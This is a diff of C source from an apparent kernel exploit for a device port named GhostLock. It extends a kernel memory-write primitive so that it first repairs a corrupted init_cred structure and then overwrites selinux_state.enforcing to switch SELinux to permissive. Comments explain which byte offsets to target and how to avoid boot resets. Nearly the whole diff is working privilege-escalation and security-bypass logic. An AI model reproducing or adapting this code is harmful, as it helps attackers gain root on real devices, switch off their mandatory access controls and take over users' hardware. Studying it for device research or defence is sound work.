@@ -1,4 +1,8 @@
+// SPDX-License-Identifier: Apache-2.0
+// Modified for the GhostLock Humane AI Pin port; see docs/PROVENANCE.md.
+
 #include "common.h"
+#include "cred_followup.h"
 
 #define DIRECT_WRITE_TIMEOUT_SEC 180
 #define DIRECT_WRITE_FOLLOWUP_TIMEOUT_SEC 1200
@@ -45,8 +49,9 @@ static void kill_and_reap_group(pid_t child) {
 
 static int direct_pselect_write_once_internal(
     uintptr_t target, uintptr_t value, int shape, int idx,
-    uintptr_t followup_target, int followup_idx) {
-  if (shape < 0 || shape > 1) {
+    uintptr_t repair_target, int repair_idx,
+    uintptr_t selinux_target, int selinux_idx) {
+  if (shape < 0 || shape > 1 || (selinux_target && !repair_target)) {
     errno = EINVAL;
     return 0;
   }
@@ -98,9 +103,33 @@ static int direct_pselect_write_once_internal(
     int triggered = atomic_load(&route_done) &&
                     atomic_load(&consumer_calls) > 0 &&
                     atomic_load(&consumer_success) > 0;
-    if (triggered && followup_target) {
+    if (triggered && repair_target) {
+      struct ghostlock_cred_followup followup;
+      ghostlock_cred_followup_init(&followup, selinux_target != 0);
+
+      for (int attempt = 0;
+           ghostlock_cred_followup_next(&followup) ==
+               GHOSTLOCK_CRED_FOLLOWUP_REPAIR &&
+           attempt < DIRECT_FOLLOWUP_ATTEMPTS;
+           attempt++) {
+        int repair_ok = direct_pselect_write_once(
+            repair_target, 0, 1, repair_idx + attempt);
+        ghostlock_cred_followup_note(
+            &followup, GHOSTLOCK_CRED_FOLLOWUP_REPAIR,
+            repair_ok, repair_ok);
+      }
+      if (ghostlock_cred_followup_next(&followup) ==
+          GHOSTLOCK_CRED_FOLLOWUP_REPAIR) {
+        _exit(15);
+      }
+
       /*
-       * The only follow-up target is selinux_state.enforcing, a byte at an
+       * Repair init_cred before attempting this second follow-up.  The
+       * credential-pointer shape collateral-modifies init_cred, so leaving
+       * the parent asleep on malformed IDs while preparing the SELinux write
+       * caused repeatable late-boot resets.
+       *
+       * The SELinux target is selinux_state.enforcing, a byte at an
        * unaligned address.  Shape 0 preserves that exact address; shape 1
        * masks the low rb-parent bits and lands one byte early at
        * selinux_state.disabled.  The direct-map pointer has a zero low byte,
@@ -108,23 +137,32 @@ static int direct_pselect_write_once_internal(
        * the neighboring boolean fields nonzero until policy reload repairs
        * them in the parent.
        */
-      uintptr_t followup_value = page_base + 0x100;
-      if ((followup_value & 0xff) != 0 ||
-          ((followup_value >> 8) & 0xff) == 0 ||
-          ((followup_value >> 16) & 0xff) == 0 ||
-          !is_direct_ptr(followup_value)) {
-        _exit(14);
-      }
+      if (selinux_target) {
+        uintptr_t followup_value = page_base + 0x100;
+        if ((followup_value & 0xff) != 0 ||
+            ((followup_value >> 8) & 0xff) == 0 ||
+            ((followup_value >> 16) & 0xff) == 0 ||
+            !is_direct_ptr(followup_value)) {
+          _exit(14);
+        }
 
-      int followup_ok = selinux_is_permissive();
-      for (int attempt = 0;
-           !followup_ok && attempt < DIRECT_FOLLOWUP_ATTEMPTS;
-           attempt++) {
-        int route_ok = direct_pselect_write_once(
-            followup_target, followup_value, 0, followup_idx + attempt);
-        followup_ok = route_ok && selinux_is_permissive();
+        for (int attempt = 0;
+             ghostlock_cred_followup_next(&followup) ==
+                 GHOSTLOCK_CRED_FOLLOWUP_SELINUX &&
+             attempt < DIRECT_FOLLOWUP_ATTEMPTS;
+             attempt++) {
+          int route_ok = direct_pselect_write_once(
+              selinux_target, followup_value, 0, selinux_idx + attempt);
+          int permissive = selinux_is_permissive();
+          ghostlock_cred_followup_note(
+              &followup, GHOSTLOCK_CRED_FOLLOWUP_SELINUX,
+              route_ok, permissive);
+        }
       }
-      _exit(followup_ok ? 0 : 15);
+      _exit(ghostlock_cred_followup_next(&followup) ==
+                    GHOSTLOCK_CRED_FOLLOWUP_COMPLETE
+                ? 0
+                : 17);
     }
     _exit(triggered ? 0 : 16);
   }
@@ -134,7 +172,7 @@ static int direct_pselect_write_once_internal(
                idx, child, errno);
   }
 
-  int timeout_seconds = followup_target
+  int timeout_seconds = repair_target
                             ? DIRECT_WRITE_FOLLOWUP_TIMEOUT_SEC
                             : DIRECT_WRITE_TIMEOUT_SEC;
   uint64_t deadline =
@@ -172,12 +210,14 @@ static int direct_pselect_write_once_internal(
 int direct_pselect_write_once(
     uintptr_t target, uintptr_t value, int shape, int idx) {
   return direct_pselect_write_once_internal(
-      target, value, shape, idx, 0, 0);
+      target, value, shape, idx, 0, 0, 0, 0);
 }
 
-int direct_pselect_write_followup_once(
+int direct_pselect_write_repaired_once(
     uintptr_t target, uintptr_t value, int shape, int idx,
-    uintptr_t followup_target, int followup_idx) {
+    uintptr_t repair_target, int repair_idx,
+    uintptr_t selinux_target, int selinux_idx) {
   return direct_pselect_write_once_internal(
-      target, value, shape, idx, followup_target, followup_idx);
+      target, value, shape, idx, repair_target, repair_idx,
+      selinux_target, selinux_idx);
 }
